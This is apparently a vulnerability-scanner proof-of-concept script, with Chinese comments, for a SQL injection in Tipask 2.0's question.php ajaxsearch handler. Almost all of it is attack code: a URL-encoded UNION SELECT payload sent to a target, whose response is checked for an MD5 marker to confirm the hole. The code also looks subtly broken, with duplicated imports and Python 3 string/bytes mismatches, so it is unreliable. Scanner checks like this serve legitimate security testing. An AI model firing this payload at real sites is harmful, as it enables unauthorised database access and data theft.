# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'Tipask_0001_p'  # 平台漏洞编号，留空
    name = 'Tipask 2.0 /control/question.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-09-11'  # 漏洞公布时间
    desc = '''
        tipask，即Tipask问答系统，是一款开放源码的PHP仿百度知道程序。
        Tipask 2.0 文件/control/question.php中Onajaxsearch函数对get的第二个参数urldecode后直接传入SQL语句，
        绕过了前面的过滤和检查，导致SQL注入的产生。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=025802'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Tipask'  # 漏洞应用名称
    product_version = '2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6fd87cd6-6e05-4d7f-a779-fe2cb690a830'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = (r'/?question/ajaxsearch/%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43'
                       '%54%20%31%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%6d%64%35'
                       '%28%33%2e%31%34%31%35%38%32%36%34%33%29%2c%31%30%2c%31%31%2c%31%32'
                       '%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%23')
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url, '')
            content = urllib.request.urlopen(req).read()
            if '5b93a4e6621594fc5149f47753844a8d' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
